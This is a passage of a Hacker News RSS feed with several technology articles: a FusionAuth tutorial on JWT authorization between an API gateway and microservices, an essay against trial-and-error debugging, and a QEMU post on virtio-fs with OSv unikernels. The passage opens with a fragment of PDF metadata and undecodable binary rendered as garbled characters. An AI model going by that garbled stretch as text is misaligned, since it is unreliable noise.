         <xmp:metadatadate>2019-01-18T13:13:43-05:00</xmp:metadatadate>
         <xmp:creatortool>Acrobat PDFMaker 15 for Word</xmp:creatortool>
         <xmpmm:documentid>uuid:94187431-f8c4-40b7-bdb3-fa92848afafd</xmpmm:documentid>
         <xmpmm:instanceid>uuid:96c8373f-a802-…</xmpmm:instanceid></rdf:description></rdf:rdf></x:xmpmeta></l±éæ,ú¸ìqã¨à‘`nc–#.¬ï[mšh2ú¯‰l></j></rù´˜u¸gå–éõõ?></kœvqp·pä></p></qœzq|žañ<±q"æòám�7ž¤z‹a,j�†ú‘¢³$fàgóšqða—p€ëdæä¾yq¼q3�´~ayhåcò“íhø°ç½†@r€0³(câµû†kÿsàj£á`û#›²úì8äqe3‚_�ïû,ab‚'ìp‡§0®0 (></q.¼ñˆt0ü‰µ#®@n“ ‹�{nhs()></vˆñä"céhà)þ\g*‡î„ë~ãp7‚¬÷></l¶šµò­·¯uá*~ˆóx!"ö></ejò‚èôùæ�ìc÷§q></sœx‚zc)v:&è\´;{âdéç)jq(f"¯”èƒã³†ä1¤ˆïyôç°òˆ8l9ù&»�_ÿœããâ²^žòþåñçeœôcnø£¤˜†w%nõiºd\ÿ�ç;¬€o6:ê]-></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019">https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019</a></em></p>]]>
            </description>
            <link>https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077762</guid>
            <pubDate>Fri, 13 Nov 2020 01:28:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealth edtech startup just raised a $4.3M seed – here's their Notion page]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077615">thread link</a>) | @jcs87
<br/>
November 12, 2020 | https://www.notion.so/Wes-and-Gagan-s-new-startup-bf8ae789fded4753b0f54a85ce5315c0 | <a href="https://web.archive.org/web/*/https://www.notion.so/Wes-and-Gagan-s-new-startup-bf8ae789fded4753b0f54a85ce5315c0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/Wes-and-Gagan-s-new-startup-bf8ae789fded4753b0f54a85ce5315c0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077615</guid>
            <pubDate>Fri, 13 Nov 2020 01:11:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[JWT Authorization in a Microservices Gateway]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077446">thread link</a>) | @mooreds
<br/>
November 12, 2020 | https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/ | <a href="https://web.archive.org/web/*/https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>In a recent article, we set up an API gateway with microservices for an eCommerce enterprise. FusionAuth handled our centralized authentication and then we passed user details for authorization to the microservices.</p>

<!--more-->

<p>In this article, we’ll build on the <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway">example project</a> from that article, focusing on tightening up security by implementing <a href="https://tools.ietf.org/html/rfc7519">JSON Web Token</a> (JWT) authorization. This is a critical security concern because we don’t want to allow just any application to call our microservices. You may want to re-read the <a href="https://fusionauth.io/blog/2020/09/15/microservices-gateway/">Centralized Authentication with a Microservices Gateway</a> post to refresh your memory. And we’ve created a new <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway-jwtauth">sample project</a> with updated source code based on this article.</p>

<p>Even though we’re allowing public access to the Product Catalog, we still want that traffic to come through our gateway application. That will ensure centralized access to our Product Catalog, and our microservices will be more protected.</p>

<p>So here’s what we’ll do:</p>

<ul>
  <li>Add the <code>jsonwebtoken</code> package to our gateway and microservices.</li>
  <li>Utilize FusionAuth’s HMAC default signing key to create <a href="https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/">signed JWTs</a> for the gateway to pass to the microservices.</li>
  <li>Add roles to this JWT if the user is present.</li>
  <li>Decode that JWT in each of the microservices, using the same signing key, to verif the request.</li>
</ul>

<p>This JWT will take the place of the API key used to ensure only the gateway accesses these services. Because it is a JWT, it can contain additional information for the microservices.</p>

<h2 id="jwt-authorization">JWT Authorization</h2>

<p>JWTs are a standardized method for securely passing claims between two parties, allowing that information to be verified by the recipient. We’re going to use them for the purpose of authorization (authorizing the gateway to access the microservices) as well as passing information (user claims, such as role membership).</p>

<p>If you are going to make the code changes, clone the <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway-jwtauth">example project</a>, otherwise feel free to follow along conceptually.</p>

<p>In your gateway application, install <code>jsonwebtoken</code>:</p>



<p>Next we’ll head over to FusionAuth to get our key for signing the JWT.</p>

<h3 id="signing-the-jwt-using-fusionauths-key">Signing the JWT using FusionAuth’s key</h3>
<p>By signing JWTs using FusionAuth’s default signing key, we’re effectively limiting access to applications that have the key, thus allowing private microservices to ensure the incoming message is from a trusted caller: the gateway.</p>

<p>Because we control all the microservices, we’ll use a symmetric signing algorithm, such as HMAC. We could also use a public/private key signing algorithm, such as RSA, which would be less performant but wouldn’t require us to share a secret between the signer of the JWT and its consumers.</p>

<p>To access your FusionAuth default signing key, go to <strong>Settings &gt; Key Master</strong>, click on the magnifying glass next to the key with the name “Default signing key”, then reveal it and copy the value of the “Secret”.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/microservices-jwt-auth/signing-key-secret.png" alt="Finding the JWT signing key value."></p>

<p>Now we add this value as a variable to the gateway application (in <code>/routes/index.js</code>) and require the <code>jsonwebtoken</code> library.</p>

<p>In production applications, avoid storing secrets in code. Instead, use a separate secrets store and obtain the secret from that store at runtime. Below we illustrate how to pull this value from an environment variable, which is a good option for some deployment environments.</p>

<div><div><pre><code><span>// ...</span>
<span>const</span> <span>jwtSigningKey</span> <span>=</span> <span>'</span><span>[Default Signing Key]</span><span>'</span><span>;</span>
<span>const</span> <span>jwt</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>jsonwebtoken</span><span>'</span><span>);</span>
<span>// ...</span>
</code></pre></div></div>

<p>Next, we’ll add a function at the end of that file to get the gateway <code>Bearer</code> token which will then be forwarded to the microservices. In this case, we are setting the token to expire in ten minutes. This is a common duration of the JWT, but you may want to reduce it for security concerns, as described in FusionAuth’s article on <a href="https://fusionauth.io/learn/expert-advice/tokens/revoking-jwts/">Revoking JWTs &amp; JWT Expiration</a>.</p>

<div><div><pre><code><span>// ...</span>
<span>function</span> <span>getGatewayBearerToken</span><span>(</span><span>req</span><span>)</span> <span>{</span>
  <span>// Recall that we put the User in the session in the previous post, but they might not be logged in so protect this code</span>
  <span>// from a null User. </span>
  <span>var</span> <span>user</span> <span>=</span> <span>req</span><span>.</span><span>session</span><span>.</span><span>user</span><span>;</span>
  <span>var</span> <span>token</span> <span>=</span> <span>jwt</span><span>.</span><span>sign</span><span>({</span> <span>data</span><span>:</span> <span>req</span><span>.</span><span>url</span><span>,</span> <span>roles</span><span>:</span> <span>user</span> <span>!==</span> <span>null</span> <span>?</span> <span>user</span><span>.</span><span>registrations</span><span>[</span><span>0</span><span>].</span><span>roles</span> <span>:</span> <span>null</span> <span>},</span> <span>jwtSigningKey</span><span>,</span> <span>{</span> <span>expiresIn</span><span>:</span> <span>'</span><span>10m</span><span>'</span><span>,</span> <span>subject</span><span>:</span> <span>'</span><span>gateway</span><span>'</span><span>,</span> <span>issuer</span><span>:</span> <span>req</span><span>.</span><span>get</span><span>(</span><span>'</span><span>host</span><span>'</span><span>)</span> <span>});</span>
  <span>return</span> <span>'</span><span>Bearer </span><span>'</span> <span>+</span> <span>token</span><span>;</span>
<span>}</span>
<span>// ...</span>
</code></pre></div></div>

<p><code>getGatewayBearerToken()</code> creates a bearer token valid for ten minutes and utilizes our public signing key. It’s how we will provide secure, general access between the gateway and any microservices which don’t require any further authorization. All this JWT is guaranteeing is that the request for the API came through the gateway.</p>

<h2 id="gateway-router-integration">Gateway Router Integration</h2>
<p>For the Product Catalog routes, we’ll use <code>getGatewayBearerToken()</code> to prepare the <code>Bearer</code> token and attach it to the <code>authorization</code> header.</p>

<div><div><pre><code><span>router</span><span>.</span><span>get</span><span>(</span><span>'</span><span>/products</span><span>'</span><span>,</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
  <span>const</span> <span>bearerToken</span> <span>=</span> <span>getGatewayBearerToken</span><span>(</span><span>req</span><span>);</span>
  <span>const</span> <span>options</span> <span>=</span> <span>{</span>
    <span>url</span><span>:</span> <span>`</span><span>${</span><span>productUrl</span><span>}</span><span>/products`</span><span>,</span>
    <span>headers</span><span>:</span> <span>{</span> <span>authorization</span><span>:</span> <span>bearerToken</span> <span>}</span>
  <span>};</span>
  <span>request</span><span>(</span><span>options</span><span>).</span><span>pipe</span><span>(</span><span>res</span><span>);</span>
<span>});</span>
</code></pre></div></div>

<p>Let’s update one other route in the API Gateway. This is the protected route that requires the user to be logged in and authenticated. We will pass a <code>Bearer</code> token that contains roles down to the microservices:</p>

<div><div><pre><code><span>// ...</span>
<span>/* PRODUCT INVENTORY ROUTES */</span>
<span>// The checkAuthentication function was defined in our last post and it ensures that the user is logged in or redirects</span>
<span>// them to FusionAuth to login.</span>
<span>router</span><span>.</span><span>get</span><span>(</span><span>'</span><span>/branches/:id/products</span><span>'</span><span>,</span> <span>checkAuthentication</span><span>,</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
  <span>const</span> <span>bearerToken</span> <span>=</span> <span>getGatewayBearerToken</span><span>(</span><span>req</span><span>);</span>
  <span>const</span> <span>options</span> <span>=</span> <span>{</span>
    <span>url</span><span>:</span> <span>`http://localhost:3002/branches/</span><span>${</span><span>req</span><span>.</span><span>params</span><span>.</span><span>id</span><span>}</span><span>/products`</span><span>,</span>
    <span>headers</span><span>:</span> <span>{</span> <span>authorization</span><span>:</span> <span>bearerToken</span> <span>}</span>
  <span>};</span>
  <span>request</span><span>(</span><span>options</span><span>).</span><span>pipe</span><span>(</span><span>res</span><span>);</span>
<span>});</span>
<span>// ...</span>
</code></pre></div></div>

<p>You can see that this code is nearly identical to the code for <code>/products</code> above. Since both APIs in the Gateway create a JWT and pass it down to the Microservices, they use the same method to authenticate and authorize API calls. Having everything be the same in the API Gateway is definitely a good thing and we could even extract the JWT creation code out to a middleware at some point.</p>

<h2 id="microservice-jwt-integration">Microservice JWT Integration</h2>

<p>We’re now ready for the microservices to handle the <code>Bearer</code> token passed in the header. As each microservice will need to handle the tokens in the same way, it makes sense to create a package utility that can be shared by each microservice. For example, here’s the flow of a request to the Product Catalog:</p>

<figure>
        <img src="https://fusionauth.io/assets/img/diagrams/blogs/jwt-authorization-microservices/catalog-flow.svg" alt="Retrieving the Product Catalog.">
        <figcaption>Retrieving the Product Catalog.</figcaption>
      </figure>

<h3 id="authorization-middleware">Authorization Middleware</h3>

<p>Here we’ll just cover the contents of the utility, as the <a href="https://docs.npmjs.com/creating-node-js-modules">package creation</a> is a little out of scope for this article. For convenience, we’ve included this in a <code>shared</code> folder in the <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway-jwtauth">sample project</a>.</p>

<div><div><pre><code><span>const</span> <span>jwt</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>jsonwebtoken</span><span>'</span><span>);</span>

<span>module</span><span>.</span><span>exports</span> <span>=</span> <span>function</span><span>(</span><span>options</span><span>)</span> <span>{</span>
  <span>return</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
      <span>const</span> <span>authorization</span> <span>=</span> <span>req</span><span>.</span><span>headers</span><span>.</span><span>authorization</span><span>;</span>
      <span>if</span> <span>(</span><span>!</span><span>authorization</span><span>)</span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>'</span><span>Authorization header missing. Denying request.</span><span>'</span><span>)</span>
        <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>);</span>
        <span>return</span><span>;</span>
      <span>}</span>

      <span>const</span> <span>bearer</span> <span>=</span> <span>authorization</span><span>.</span><span>split</span><span>(</span><span>'</span><span> </span><span>'</span><span>);</span>
      <span>if</span> <span>(</span><span>!</span><span>bearer</span> <span>||</span> <span>bearer</span><span>.</span><span>length</span> <span>!=</span> <span>2</span><span>)</span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>'</span><span>Bearer header value malformed. Denying request.</span><span>'</span><span>)</span>
        <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>);</span>
        <span>return</span><span>;</span>
      <span>}</span>

      <span>token</span> <span>=</span> <span>bearer</span><span>[</span><span>1</span><span>];</span>
      <span>if</span> <span>(</span><span>!</span><span>token</span><span>)</span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>'</span><span>Token not provided. Denying request.</span><span>'</span><span>)</span>
        <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>);</span>
        <span>return</span><span>;</span>
      <span>}</span>

      <span>const</span> <span>decoded_token</span> <span>=</span> <span>jwt</span><span>.</span><span>verify</span><span>(</span><span>token</span><span>,</span> <span>options</span><span>.</span><span>jwtSigningKey</span><span>);</span>
      <span>req</span><span>.</span><span>roles</span> <span>=</span> <span>decoded_token</span><span>.</span><span>roles</span><span>;</span> <span>// These could be null if the user isn't logged in</span>

    <span>}</span> <span>catch</span><span>(</span><span>err</span><span>)</span> <span>{</span>
      <span>console</span><span>.</span><span>error</span><span>(</span><span>err</span><span>);</span>
      <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>);</span>
      <span>return</span><span>;</span>
    <span>}</span>

    <span>next</span><span>();</span>
  <span>}</span>
<span>};</span>

<span>function</span> <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>options</span><span>.</span><span>loginRedirectUrl</span><span>)</span> <span>{</span>
    <span>res</span><span>.</span><span>redirect</span><span>(</span><span>options</span><span>.</span><span>loginRedirectUrl</span><span>)</span>
  <span>}</span>
  <span>else</span> <span>{</span>
    <span>res</span><span>.</span><span>status</span><span>(</span><span>401</span><span>).</span><span>json</span><span>({</span>
      <span>status</span><span>:</span> <span>401</span><span>,</span>
      <span>message</span><span>:</span> <span>'</span><span>UNAUTHORIZED</span><span>'</span>
    <span>})</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>We’re exporting a function that looks for the <code>Authorization</code> header key coming from the gateway. It goes through the following steps:</p>

<ol>
  <li>Find the <code>authorization</code> header</li>
  <li>Split the value it finds (giving us <code>Bearer</code> and the token)</li>
  <li>Grab the token portion</li>
  <li>Verify and decode the token using the <code>jwtSigningKey</code></li>
</ol>

<p>If all those steps are successful, we’ll end up with a decoded token. And if there were roles included, they will be added to <code>req</code>. For any errors in the process, the <code>handleUnauthorized</code> function will redirect to the login page and/or respond with a <code>401: UNAUTHORIZED</code>.</p>

<p>Why do we care about roles? For correct authorization in the Product Inventory service, we want to ensure a request is made with the correct role. We’ll explore that after we examine the Product Catalog integration.</p>

<h3 id="product-catalog-integration">Product Catalog Integration</h3>
<p>We have our <code>authorizationMiddleware</code> in place, and it’s pretty simple to integrate it into the Product Catalog microservice (in <code>app.js</code>):</p>

<div><div><pre><code><span>const</span> <span>{</span> <span>JWT_SIGNING_KEY</span><span>,</span> <span>LOGIN_REDIRECT_URL</span> <span>}</span> <span>=</span> <span>process</span><span>.</span><span>env</span><span>;</span>
<span>var</span> <span>authorizationMiddleware</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>authorization-middleware</span><span>'</span><span>);</span> <span>// assuming it's packaged under that name</span>

<span>// ...</span>
<span>app</span><span>.</span><span>use</span><span>(</span><span>authorizationMiddleware</span><span>({</span> <span>jwtSigningKey</span><span>:</span> <span>JWT_SIGNING_KEY</span><span>,</span> <span>loginRedirectUrl</span><span>:</span> <span>LOGIN_REDIRECT_URL</span> <span>}));</span>
<span>app</span><span>.</span><span>use</span><span>(</span><span>'</span><span>/</span><span>'</span><span>,</span> <span>indexRouter</span><span>);</span>
<span>//...</span>
</code></pre></div></div>
<p>Note that we’re using the <code>authorizationMiddleware</code> prior to the <code>indexRouter</code>, which will ensure the middleware is applied to all our routes.</p>

<p>Remember that we’re using the <code>jwtSigningKey</code> to verify the JWT has been signed with the FusionAuth default signing key. Above, we manually pasted the string in, but here we’ve implemented it as an environment variable. This is better than hard-coding the key in code.</p>

<p>In your local environment, you can add your <code>JWT_SIGNING_KEY</code> to your <code>bash_profile</code> or export it to your environment:</p>
<div><div><pre><code><span>export </span><span>JWT_SIGNING_KEY</span><span>=[</span>Default Signing Key]
</code></pre></div></div>

<p>Make sure you restart your microservices after you’ve set this environment variable.</p>

<h2 id="product-inventory-integration">Product Inventory Integration</h2>
<p>The Product Inventory service endpoint, <code>/branches/:id/product</code> has role-based access. Previously we were pulling that from a FusionAuth generated JWT, but let’s pull …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/">https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/</a></em></p>]]>
            </description>
            <link>https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077446</guid>
            <pubDate>Fri, 13 Nov 2020 00:51:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don’t Be an Evolutionary Programmer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077333">thread link</a>) | @whack
<br/>
November 12, 2020 | https://software.rajivprab.com/2018/04/29/dont-be-an-evolutionary-programmer/ | <a href="https://web.archive.org/web/*/https://software.rajivprab.com/2018/04/29/dont-be-an-evolutionary-programmer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<div><figure><a href="https://www.flickr.com/photos/45752180@N03/5465488239" target="_blank" rel="noreferrer noopener"><img data-attachment-id="173" data-permalink="https://software.rajivprab.com/5465488239_bd90ac9589_z/" data-orig-file="https://softwarerajivprab.files.wordpress.com/2019/07/5465488239_bd90ac9589_z.jpg" data-orig-size="556,369" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="5465488239_bd90ac9589_z" data-image-description="" data-medium-file="https://softwarerajivprab.files.wordpress.com/2019/07/5465488239_bd90ac9589_z.jpg?w=300" data-large-file="https://softwarerajivprab.files.wordpress.com/2019/07/5465488239_bd90ac9589_z.jpg?w=556" src="https://softwarerajivprab.files.wordpress.com/2019/07/5465488239_bd90ac9589_z.jpg" alt=""></a></figure></div>



<p><span>When you run into a problem, a bug in your code, how do you try to fix it?</span></p>



<p><span>Do you try to debug the problem, in order to figure out what the root cause is? Do you use tools like debuggers, loggers or code inspections, in order to better understand where and what is causing the problem, and then carefully analyze the best way to fix it?</span></p>



<p><span>Or do you make random changes to random parts of your code, see if that fixes anything, and repeat the above loop over and over again until things start working?</span></p>



<p><span>I like to call the latter approach </span><i>“</i><i><span>Evolutionary Programming</span></i><span>“. Comparing this style of programming to evolution is probably giving it too much credit, but it’s actually a pretty apt analogy. Evolution, through random mutation and natural selection, is the polar opposite of </span><a rel="noopener" href="https://en.wikipedia.org/wiki/Intelligent_design" target="_blank">Intelligent Design</a><span>. Evolution has no sense of analysis, design or intelligence. It simply mutates random portions of your code (DNA), keeps the changes that “made things better,” discards the rest, and keeps looping through this forever until it gets to something successful.</span></p>



<p><span>Such an evolutionary approach is already being used in specific subdomains, such as </span><a href="https://en.wikipedia.org/wiki/Machine_learning" target="_blank" rel="noopener">Machine Learning</a><span> and AI development. Maybe one day, someone will figure out how to make the evolutionary approach work in mainstream Java programming as well. However, that day is certainly not today. If you’re a programmer and your personal approach to fixing bugs is to rely on the Evolutionary Method, don’t. You’re doing something very very wrong.</span></p>



<p><i><span>“But evolution works”</span></i><span> you may argue. </span><i><span>“If it can produce something as complex as human beings, why not use that same method in my daily programming?”</span></i><span> Well, consider this:</span></p>



<ul><li>It took evolution a billion years to accomplish what software developers were able to accomplish in decades. That’s a 10000000x difference in development velocity.</li><li><span>The end-product of evolution is something so complex, that no human mind can understand it. Consider the </span>millennia<span> that men have spent studying biology &amp; medicine, and we’ve only just started to scratch the surface in the past century.</span></li><li><span>The systems produced by evolution are so interconnected and tightly coupled, that it’s impossible to fix one problem with introducing 100 others. If you need proof of this, look at the list of side-effects that accompany any medical drug.</span></li></ul>



<p><span>I bring up this topic, because I just witnessed it first hand during an interview with an undoubtedly bright candidate. After 40 minutes of building a complex data-structure, it came time to test his creation. He knocked a few easy bugs out of the way in the first few iterations, but hit a brick wall on a more complicated bug. </span></p>



<p><span>Instead of digging deeper into the code in order to understand what it was doing, or using the debug tools in order to narrow down the specific code-block which was showing buggy behavior, he decided to fork off an evolutionary branch. He started mutating random parts of his code, and rerunning, just to see if that somehow fixed things. After 15 minutes without any progress whatsoever, he gave up and was even more confused than when he started.</span></p>



<p><span>A short while later, when trying to debug his code myself, I realized that he actually had a typo in his test-input. Turns out his code was right all along. But by focusing all his efforts on fixing a non-existent bug, instead of trying to understand the real cause of the error, he ended up getting further and further away from the solution with each step.</span></p>



<p><span>If you’re somebody with no aptitude whatsoever for analyzing systems, the evolutionary approach might be your best remaining option. But if your intellectual capacity is indeed lacking so significantly, you really should reconsider your career choice. A different profession, such as politics, might be more up your alley. Maybe one day, someone will build an AI that is capable of developing software using an evolutionary approach. Such a system may actually be successful, because computers can be massively scaled out and parallelized. Unfortunately, the same cannot be said of your labor.</span></p>



<p><span>The next time you hit a problem, don’t just make random changes until something somehow starts working. Such an approach may work in the ultra-short-term, but it’s only going to produce spaghetti code that no one else will be able to understand, reuse or improve upon. You’re not a force of nature, nor are you a robot. Leave evolution to the science textbooks and start practicing some intelligent design.</span></p>



<hr>



<p><em><span>Discussion on </span><a rel="noopener" href="https://www.reddit.com/r/coding/comments/471ua3/dont_be_an_evolutionary_programmer/" target="_blank">/r/coding</a><br><span>Discussion on </span><a rel="noopener" href="https://www.reddit.com/r/programming/comments/471txe/dont_be_an_evolutionary_programmer/" target="_blank">/r/programming</a><br><a rel="noopener" href="http://www.thecaucus.net/#/content/caucus/tech_blog/359" target="_blank">Original post</a> from 2016</em></p>
	</div><div>
				<p><strong>Published</strong>
			<time datetime="2018-04-29T19:40:25+00:00">2018-04-29</time><time datetime="2019-09-10T12:43:47+00:00">2019-09-10</time>		</p><!-- .site-posted-on -->
	</div></div>]]>
            </description>
            <link>https://software.rajivprab.com/2018/04/29/dont-be-an-evolutionary-programmer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077333</guid>
            <pubDate>Fri, 13 Nov 2020 00:36:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Virtio-FS on a Unikernel]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077279">thread link</a>) | @eyberg
<br/>
November 12, 2020 | https://www.qemu.org/2020/11/03/osv-virtio-fs/ | <a href="https://web.archive.org/web/*/https://www.qemu.org/2020/11/03/osv-virtio-fs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
		<div>
			<!-- Main -->
	<section>
		<header>
			
			<p>03 Nov 2020 — by Fotis Xenakis</p>
		</header>
		<p>This article provides an overview of <a href="https://virtio-fs.gitlab.io/">virtio-fs</a>,
a novel way for sharing the host file system with guests and
<a href="https://github.com/cloudius-systems/osv">OSv</a>, a specialized, lightweight
operating system (unikernel) for the cloud, as well as how these two fit
together.</p>

<h2 id="virtio-fs">virtio-fs</h2>

<p>Virtio-fs is a new host-guest shared filesystem, purpose-built for local file
system semantics and performance. To that end, it takes full advantage of the
host’s and the guest’s colocation on the same physical machine, unlike
network-based efforts, like virtio-9p.</p>

<p>As the name suggests, virtio-fs builds on virtio for providing an efficient
transport: it is included in the (currently draft, to become v1.2) virtio
<a href="https://github.com/oasis-tcs/virtio-spec">specification</a> as a new device. The
protocol used by the device is a slightly extended version of
<a href="https://github.com/libfuse/libfuse">FUSE</a>, providing a solid foundation for
all file system operations native on Linux. Implementation-wise, on the QEMU
side, it takes the approach of splitting between the guest interface (handled
by QEMU) and the host file system interface (the device “backend”). The latter
is handled by virtiofsd (“virtio-fs daemon”), running as a separate process,
utilizing the
<a href="https://www.qemu.org/docs/master/interop/vhost-user.html">vhost-user</a> protocol
to communicate with QEMU.</p>

<p>One prominent performance feature of virtio-fs is the DAX (Direct Access)
window. It’s a shared memory window between the host and the guest, exposed as
device memory (a PCI BAR) to the second. Upon request, the host (QEMU) maps file contents to the window for the guest to access directly. This bears performance
gains due to taking VMEXITs out of the read/write data path and bypassing the
guest page cache on Linux, while not counting against the VM’s memory (since
it’s just device memory, managed on the host).</p>

<p><img src="https://gitlab.com/virtio-fs/virtio-fs.gitlab.io/-/raw/master/architecture.svg" alt="virtio-fs DAX architecture"></p>

<p>Virtio-fs is under active development, with its community focussing on a pair of
device implementation in QEMU and device driver in Linux. Both components are
already available upstream in their initial iterations, while upstreaming
continues further e.g. with DAX window support.</p>

<h2 id="osv">OSv</h2>

<p>OSv is a <a href="https://en.wikipedia.org/wiki/Unikernel">unikernel</a> (framework). The
two defining characteristics of a unikernel are:</p>

<ul>
  <li><strong>Application-specialized</strong>: a unikernel is an executable machine image,
consisting of an application and supporting code (drivers, memory management,
runtime etc.) linked together, running in a single address space (typically
in guest “kernel mode”).</li>
  <li><strong>Library OS</strong>: each unikernel only contains the functionality mandated by its
application in terms of non-application code, i.e. no unused drivers, or even
whole subsystems (e.g. networking, if the application doesn’t use the
network).</li>
</ul>

<p>OSv in particular strives for binary compatibility with Linux, using a <a href="https://github.com/cloudius-systems/osv/wiki/Dynamic-Linker">dynamic
linker</a>. This means
that applications built for Linux should run as OSv unikernels without requiring
modifications or even rebuilding, at least most of the time. Of course, not the
whole Linux ABI is supported, with system calls like <code>fork()</code> and relatives
missing by design in all unikernels, which lack the notion of a process. Despite
this limitation, OSv is quite full featured, with full SMP support, virtual
memory, a virtual file system (and many filesystem implementations, including
ZFS) as well as a mature networking stack, based on the FreeBSD sources.</p>

<p>At this point, one is sure to wonder “Why bother with unikernels?”. The problem
they were originally
<a href="http://unikernel.org/files/2013-asplos-mirage.pdf">introduced</a> to solve is the
bloated software stack in modern cloud computing. Running general-purpose
operating systems as guests, typically for a single application/service, on top
of a hypervisor which already takes care of isolation and provides a standard
device model means duplication, as well as loss of efficiency. This is were
unikernels come in, trying to be just enough to support a single application
and as light-weight as possible, based on the assumption that they are executing
inside a VM. Below is an illustration of the comparison between
general-purpose OS, unikernels and containers (as another approach to the same
problem, for completeness).</p>

<p><img src="https://www.qemu.org/screenshots/2020-11-04-unikernel-vs-gpos.svg" alt="Unikernels vs GPOS vs containers"></p>

<h2 id="osv-meet-virtio-fs">OSv, meet virtio-fs</h2>

<p>As is apparent e.g. from the container world, it is very common for applications
running in isolated environments (such as containers, or unikernels even more
so) to require host file system access. Whereas containers sharing the host
kernel thus have an obvious, controlled path to the host file system, with
unikernels this has been more complex: all solutions were somewhat heavyweight,
requiring a network link or indirection through network protocols. Virtio-fs
then provided a significantly more attractive route: straight-forward mapping of
fs operations (via FUSE), reusing the existing virtio transport and decent
performance without high memory overhead.</p>

<p>The OSv community quickly identified the opportunity and came up with a
read-only implementation on its side, when executing under QEMU. This emphasized
being lightweight complexity-wise, while catering to many of its applications’
requirements (they are stateless, think e.g. serverless). Notably, it includes
support for the DAX window (even before that’s merged in upstream QEMU),
providing <a href="https://github.com/foxeng/diploma">excellent performance</a>, directly
rivalling that of its local (non-shared) counterparts such as ZFS and ROFS (an
OSv-specific read-only file system).</p>

<p>One central point is OSv’s support for booting from virtio-fs: this enables
deploying a modified version or a whole new application <strong>without rebuilding</strong>
the image, just by adjusting its root file system contents on the host. Last,
owing to the DAX window practically providing low-overhead access to the host’s
page cache, scalability is also expected to excel, with it being a common
concern due to the potentially high density of unikernels per host.</p>

<p>For example, to build the <code>cli</code> OSv image, bootable from virtio-fs, using the
core OSv <a href="https://github.com/cloudius-systems/osv#building-osv-kernel-and-creating-images">build
system</a>:</p>
<div><div><pre><code>scripts/build fs=virtiofs export=all image=cli
</code></pre></div></div>
<p>This results in a minimal image (just the initramfs), while the root fs contents
are placed in a directory on the host (<code>build/export</code> here, by default).</p>

<p><a href="https://github.com/cloudius-systems/osv#running-osv">Running</a> the above image
is just a step away (may want to use the virtio-fs development version of
<a href="https://gitlab.com/virtio-fs/qemu/-/tree/virtio-fs-dev">QEMU</a>, e.g. for DAX
window support):</p>
<div><div><pre><code>scripts/run.py --virtio-fs-tag=myfs --virtio-fs-dir=$(pwd)/build/export
</code></pre></div></div>
<p>This orchestrates running both virtiofsd and QEMU, using the contents of
